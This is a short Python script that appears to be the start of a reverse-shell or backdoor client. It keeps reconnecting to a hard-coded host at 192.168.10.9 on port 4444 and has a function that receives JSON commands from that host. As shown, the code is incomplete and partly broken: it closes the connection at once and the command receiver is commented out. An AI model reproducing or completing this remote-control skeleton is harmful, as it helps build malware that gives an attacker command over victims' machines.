import socket
import json
import os
import time
def recvcmd():
    data=''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue






def connect():
    try:
        time.sleep(3)
        s.connect(('192.168.10.9',4444))
        print("[+]  connected!")
        s.close()
    except:
        print("[-]  reconnecting...")
        connect()
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect()
#recvcmd()
